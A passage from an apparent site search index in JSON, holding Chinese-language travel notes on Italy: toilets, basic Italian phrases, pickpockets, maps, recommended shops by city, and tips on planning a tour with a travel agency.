\u200b\u6b27\u5143\u200b\uff0c\u200b\u6b64\u65f6\u200b\u6700\u597d\u200b\u81ea\u5907\u200b\u96f6\u94b1\u200b\uff0c\u200b\u90e8\u5206\u200b\u5395\u6240\u200b\u6709\u200b\u5de5\u4f5c\u4eba\u5458\u200b\u5e2e\u52a9\u200b\u627e\u96f6\u200b\u3002\u200b\u5efa\u8bae\u200b\u517b\u6210\u200b\u4e60\u60ef\u200b\uff0c\u200b\u5728\u200b\u79bb\u5f00\u200b\u9152\u5e97\u200b\u6216\u8005\u200b\u5403\u5b8c\u996d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u53bb\u200b\u4e0a\u200b\u4e00\u6b21\u200b\u5395\u6240\u200b\u3002</p>"},{"location":"travel/italy.html#_11","title":"\u8bed\u8a00","text":"<p>\u200b\u610f\u5927\u5229\u8bed\u200b\u548c\u200b\u897f\u73ed\u7259\u8bed\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u5982\u679c\u200b\u4f60\u200b\u5b66\u8fc7\u200b\u897f\u73ed\u7259\u8bed\u200b\uff0c\u200b\u4f1a\u200b\u89c9\u5f97\u200b\u53d1\u97f3\u200b\u89c4\u5219\u200b\u5341\u5206\u200b\u76f8\u8fd1\u200b\uff0c\u200b\u5f88\u591a\u200b\u8bcd\u8bed\u200b\u4e5f\u200b\u957f\u200b\u7684\u200b\u5f88\u200b\u50cf\u200b\u3002\u200b\u4e0b\u9762\u200b\u662f\u200b\u4e00\u4e9b\u200b\u5e38\u7528\u200b\u7684\u200b\u610f\u5927\u5229\u8bed\u200b\uff1a</p> <ol> <li>Ciao\uff1a\u200b\u4f60\u597d\u200b/\u200b\u518d\u89c1\u200b</li> <li>Buongiorno\uff1a\u200b\u65e9\u4e0a\u597d\u200b\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u4e0b\u5348\u200b\u4e5f\u200b\u4f1a\u200b\u8bf4\u200b</li> <li>Grazie\uff1a\u200b\u8c22\u8c22\u200b</li> <li>Uscita\uff1a\u200b\u51fa\u53e3\u200b</li> <li>Biglietti\uff1a\u200b\u7968\u52a1\u200b</li> <li>Via\uff1a\u200b\u8def\u200b</li> <li>Piazza\uff1a\u200b\u5e7f\u573a\u200b</li> <li>Duomo\uff1a\u200b\u5927\u200b\u6559\u5802\u200b</li> <li>Ristorante\uff1a\u200b\u9910\u5385\u200b</li> </ol> <p>\u200b\u4e0b\u9762\u200b\u5217\u51fa\u200b\u610f\u5927\u5229\u200b\u7684\u200b\u4e3b\u8981\u200b\u57ce\u5e02\u200b\u7684\u200b\u4e2d\u82f1\u200b\u610f\u6587\u200b\u5bf9\u7167\u200b\uff1a</p> <ol> <li>\u200b\u7f57\u9a6c\u200b Rome Roma</li> <li>\u200b\u4f5b\u7f57\u4f26\u8428\u200b Florence Firenze</li> <li>\u200b\u7c73\u5170\u200b Milan Milano</li> <li>\u200b\u90fd\u7075\u200b Turin Turino</li> <li>\u200b\u5a01\u5c3c\u65af\u200b Venice Venezia</li> <li>\u200b\u535a\u6d1b\u5c3c\u4e9a\u200b Bologna Bologna</li> <li>\u200b\u6bd4\u8428\u200b Pisa Pisa</li> </ol>"},{"location":"travel/italy.html#_12","title":"\u9632\u76d7","text":"<p>\u200b\u65c5\u884c\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\uff0c\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u9632\u76d7\u200b\uff0c\u200b\u628a\u200b\u91cd\u8981\u200b\u7269\u54c1\u200b\u968f\u8eab\u5e26\u200b\uff0c\u200b\u5e76\u4e14\u200b\u653e\u5230\u200b\u8eab\u524d\u200b\u3002\u200b\u5c3d\u91cf\u200b\u4e0d\u8981\u200b\u53bb\u200b\u5c0f\u5077\u200b\u591a\u200b\u7684\u200b\u5730\u65b9\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u627e\u200b\u6709\u200b\u7ecf\u9a8c\u200b\u7684\u200b\u4e2d\u56fd\u200b\u5bfc\u6e38\u200b\uff0c\u200b\u4ed6\u4eec\u200b\u53ef\u4ee5\u200b\u8bc6\u522b\u200b\u5c0f\u5077\u200b\u3002</p>"},{"location":"travel/italy.html#_13","title":"\u5730\u56fe","text":"<p>\u200b\u5728\u200b\u610f\u5927\u5229\u200b\u5168\u7a0b\u200b\u7528\u200b Google Map \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4e86\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6bcf\u5929\u200b\u6574\u7406\u200b\u7b2c\u4e8c\u5929\u200b\u7684\u200b\u884c\u7a0b\u200b\uff0c\u200b\u628a\u200b\u8981\u200b\u53bb\u200b\u7684\u200b\u5730\u65b9\u200b\u90fd\u200b\u5728\u200b\u5730\u56fe\u200b\u4e0a\u200b\u6253\u200b\u597d\u200b\u6807\u8bb0\u200b\uff0c\u200b\u65b9\u4fbf\u200b\u627e\u5230\u200b\u60f3\u200b\u53bb\u200b\u7684\u200b\u666f\u70b9\u200b\u3002\u200b\u5404\u4e2a\u200b\u57ce\u5e02\u200b\u9700\u8981\u200b\u6253\u5361\u200b\u6216\u8005\u200b\u503c\u5f97\u200b\u53bb\u200b\u7684\u200b\u5730\u65b9\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5c0f\u7ea2\u200b\u4e66\u4e0a\u200b\u641c\u7d22\u200b\u3002\u200b\u610f\u5927\u5229\u200b\u5f88\u591a\u200b\u5730\u65b9\u200b\u90fd\u200b\u6709\u200b\u5f53\u5730\u200b\u666f\u70b9\u200b\u4e3b\u9898\u200b\u7684\u200b\u73bb\u7483\u200b\u51b0\u7bb1\u200b\u8d34\u200b\uff0c\u200b\u559c\u6b22\u200b\u7684\u8bdd\u200b\u53ef\u4ee5\u200b\u5c1d\u8bd5\u200b\u6536\u96c6\u200b\u3002\u200b\u4e0b\u9762\u200b\u5217\u51fa\u6765\u200b\u4e00\u4e9b\u200b\u4ece\u5c0f\u7ea2\u200b\u4e66\u200b\u7b49\u200b\u9014\u5f84\u200b\u77e5\u9053\u200b\u7684\u200b\u6bd4\u8f83\u200b\u70ed\u95e8\u200b\u6216\u200b\u503c\u5f97\u200b\u53bb\u200b\u7684\u200b\u5730\u65b9\u200b/\u200b\u9879\u76ee\u200b/\u200b\u5c0f\u5e97\u200b\uff08\u200b\u9664\u200b\u70ed\u95e8\u200b\u666f\u70b9\u200b\uff09\uff1a</p> <ol> <li>Lake Como\uff1a\u200b\u5750\u200b\u6e38\u8247\u200b\u6e38\u89c8\u200b Lake Como</li> <li>Milan<ol> <li>Duomo Shop\uff1a\u200b\u5927\u200b\u6559\u5802\u200b\u76f8\u5173\u200b\u7684\u200b\u7eaa\u5ff5\u54c1\u200b</li> <li>Piumelli/Pettinaroli\uff1a\u200b\u76ae\u5177\u200b</li> </ol> </li> <li>Turin<ol> <li>Allianz Stadium\uff1a\u200b\u5c24\u6587\u56fe\u65af\u200b\u4e3b\u573a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u200b\u6bd4\u8d5b\u200b</li> </ol> </li> <li>Venice<ol> <li>Burano \u200b\u5c9b\u200b</li> <li>Libreria Acqua Alta\uff1a\u200b\u6c89\u8239\u200b\u4e66\u5e97\u200b</li> <li>Il Baule d'Oriente\uff1a\u200b\u73e0\u5b9d\u200b</li> </ol> </li> <li>Pisa<ol> <li>113 viasantamaria\uff1a\u200b\u7eaa\u5ff5\u54c1\u200b\u5e97\u200b</li> </ol> </li> <li>Florence<ol> <li>Trattoria Osteria Dall'Oste SMN\uff1a\u200b\u996d\u5e97\u200b\uff0c\u200b\u6709\u200b\u6982\u7387\u200b\u5237\u51fa\u200b\u660e\u661f\u200b</li> </ol> </li> <li>Siena<ol> <li>La Fabbrica delle Candele\uff1a\u200b\u8721\u70db\u200b</li> </ol> </li> <li>Rome<ol> <li>Gran Cafe Marcel\uff1a\u200b\u7eaa\u5ff5\u54c1\u200b\u5e97\u200b</li> <li>Nobile\uff1a\u200b\u76ae\u5177\u200b\u5e97\u200b</li> <li>OhMyGuide - Roma Mesume Store\uff1a\u200b\u7eaa\u5ff5\u54c1\u200b\u5e97\u200b</li> <li>Bottega Pinocchio\uff1a\u200b\u5339\u8bfa\u200b\u66f9\u200b</li> <li>HUMILIS\uff1a\u200b\u624b\u94fe\u200b</li> </ol> </li> <li>\u200b\u610f\u5927\u5229\u200b\u5404\u5730\u200b\u7684\u200b\u8fde\u9501\u5e97\u200b<ol> <li>L'erbolario\uff1a\u200b\u9999\u6c34\u200b</li> </ol> </li> </ol>"},{"location":"travel/itinerary.html","title":"\u884c\u7a0b","text":"<p>\u200b\u51fa\u884c\u200b\u524d\u200b\uff0c\u200b\u9700\u8981\u200b\u548c\u200b\u65c5\u884c\u793e\u200b\u786e\u5b9a\u200b\u884c\u7a0b\u200b\u3002\u200b\u901a\u5e38\u200b\u6765\u8bf4\u200b\uff0c\u200b\u65c5\u884c\u793e\u200b\u4f1a\u200b\u63d0\u4f9b\u200b\u5b9a\u597d\u200b\u7684\u200b\u5927\u56e2\u200b\uff0c\u200b\u4eba\u200b\u6bd4\u8f83\u200b\u591a\u200b\uff0c\u200b\u884c\u7a0b\u200b\u6bd4\u8f83\u200b\u56fa\u5b9a\u200b\uff0c\u200b\u4ef7\u683c\u4f4e\u200b\u4e00\u4e9b\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u627e\u200b\u65c5\u884c\u793e\u200b\u5b9a\u5236\u200b\u884c\u7a0b\u200b\uff0c\u200b\u6b64\u65f6\u200b\u4e0d\u4f1a\u200b\u6709\u200b\u5176\u4ed6\u4eba\u200b\uff0c\u200b\u53ea\u6709\u200b\u65c5\u884c\u793e\u200b\u7684\u200b\u5730\u966a\u200b\uff0c\u200b\u5730\u966a\u200b\u7684\u200b\u4e3b\u8981\u200b\u8eab\u4efd\u200b\u662f\u200b\u53f8\u673a\u200b\uff0c\u200b\u517c\u4efb\u200b\u4e00\u4e9b\u200b\u5bfc\u6e38\u200b\u7684\u200b\u804c\u80fd\u200b\u3002\u200b\u5b9a\u5236\u200b\u884c\u7a0b\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u7684\u200b\u70b9\u200b\uff1a</p> <ol> <li>\u200b\u5f00\u59cb\u200b\u548c\u200b\u7ed3\u675f\u200b\u65f6\u95f4\u200b\uff0c\u200b\u6ce8\u610f\u200b\u8981\u200b\u80fd\u591f\u200b\u88ab\u200b\u7b7e\u8bc1\u200b\u6709\u6548\u671f\u200b\u8986\u76d6\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5047\u671f\u200b\u5b89\u6392\u200b</li> <li>\u200b\u822a\u73ed\u200b\uff0c\u200b\u6ce8\u610f\u200b\u76f4\u98de\u200b\u672a\u5fc5\u200b\u662f\u200b\u6700\u200b\u4fbf\u5b9c\u200b\u7684\u200b\uff0c\u200b\u8f6c\u673a\u200b\u7684\u200b\u5957\u7968\u200b\u53ef\u80fd\u200b\u66f4\u200b\u4fbf\u5b9c\u200b\uff0c\u200b\u4f46\u662f\u200b\u65f6\u95f4\u200b\u4e5f\u200b\u66f4\u957f\u200b\uff1b\u200b\u5efa\u8bae\u200b\u7efc\u5408\u200b\u8003\u8651\u200b\u591a\u5bb6\u200b\u822a\u53f8\u200b\u548c\u200b\u4e0d\u540c\u200b\u7684\u200b\u822a\u7ebf\u200b</li> <li>\u200b\u9152\u5e97\u200b\uff0c\u200b\u5efa\u8bae\u200b\u8981\u6c42\u200b\u65c5\u884c\u793e\u200b\u63d0\u4f9b\u200b\u9152\u5e97\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5728\u200b Booking \u200b\u7b49\u200b\u7f51\u7ad9\u200b\u4e0a\u200b\u67e5\u8be2\u200b\u8bc4\u5206\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8981\u6c42\u200b\u53bb\u200b\u4e00\u4e9b\u200b\u7279\u8272\u200b\u7684\u200b\u672c\u5730\u200b\u9152\u5e97\u200b</li> <li>\u200b\u5177\u4f53\u200b\u884c\u7a0b\u200b\uff0c\u200b\u6ce8\u610f\u200b\u6bcf\u5929\u200b\u53bb\u200b\u54ea\u4e9b\u200b\u57ce\u5e02\u200b\uff0c\u200b\u5728\u200b\u54ea\u91cc\u200b\u4f4f\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u8f66\u7a0b\u200b\u9700\u8981\u200b\u7684\u200b\u65f6\u95f4\u200b\uff0c\u200b\u4e00\u5929\u200b\u4e0d\u5b9c\u200b\u5b89\u6392\u200b\u8fc7\u591a\u200b\u884c\u7a0b\u200b\uff0c\u200b\u5426\u5219\u200b\u4f1a\u200b\u75b2\u4e8e\u5954\u547d\u200b</li> <li>\u200b\u95e8\u7968\u200b\uff0c\u200b\u90e8\u5206\u200b\u666f\u70b9\u200b\u9700\u8981\u200b\u95e8\u7968\u200b\uff0c\u200b\u6709\u200b\u7684\u200b\u8fd8\u200b\u9700\u8981\u200b\u63d0\u524d\u200b\u9884\u7ea6\u200b\uff0c\u200b\u9700\u8981\u200b\u63d0\u524d\u200b\u548c\u200b\u65c5\u884c\u793e\u200b\u6c9f\u901a\u200b\u4ef7\u683c\u200b\u548c\u200b\u9884\u7ea6\u200b\u7684\u200b\u4e8b\u5b9c\u200b</li> </ol> <p>\u200b\u7533\u8bf7\u200b\u90e8\u5206\u200b\u56fd\u5bb6\u200b\u7684\u200b\u65c5\u6e38\u200b\u7b7e\u8bc1\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u9700\u8981\u200b\u4e00\u4efd\u200b\u884c\u7a0b\u200b\u3001\u200b\u673a\u7968\u200b\u548c\u200b\u9152\u5e97\u200b\u9884\u8ba2\u5355\u200b\uff0c\u200b\u901a\u5e38\u200b\u5b83\u4eec\u200b\u4e0d\u200b\u9700\u8981\u200b\u548c\u200b\u5b9e\u9645\u200b\u7684\u200b\u884c\u7a0b\u200b\u4e00\u81f4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u63d0\u524d\u200b\u505a\u200b\u4e00\u4efd\u200b\u884c\u7a0b\u200b\u5e76\u200b\u9884\u7ea6\u200b\u53ef\u4ee5\u200b\u5168\u989d\u200b\u9000\u6b3e\u200b\u7684\u200b\u9152\u5e97\u200b\uff0c\u200b\u518d\u200b\u7533\u8bf7\u200b\u7b7e\u8bc1\u200b\uff0c\u200b\u65c5\u884c\u793e\u200b\u6709\u200b\u76f8\u5173\u200b\u7684\u200b\u7b7e\u8bc1\u200b\u7533\u8bf7\u6750\u6599\u200b\u670d\u52a1\u200b\u3002</p>"}]}